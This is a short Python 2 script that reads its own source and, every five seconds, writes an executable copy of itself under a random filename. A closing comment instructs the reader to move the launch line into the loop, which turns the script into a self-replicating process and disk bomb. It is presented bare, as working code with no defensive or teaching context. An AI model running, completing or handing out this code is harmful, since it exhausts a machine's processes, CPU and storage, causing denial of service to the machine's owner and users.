import os, sys, time, uuid


# get self code
self_content = file(sys.argv[0]).read()

while True:
    # wait 5 seconds
    time.sleep(5)
    
    # create unique filename
    dupe = "%s.py" % uuid.uuid4()
    
    # open and write to the copy
    copy = open(dupe, "w")
    copy.write(self_content)
    copy.close()    
    
    # make the copy executable and execute
    os.chmod(dupe, 0755)
os.system("python %s &" % dupe)# take this line into the while function
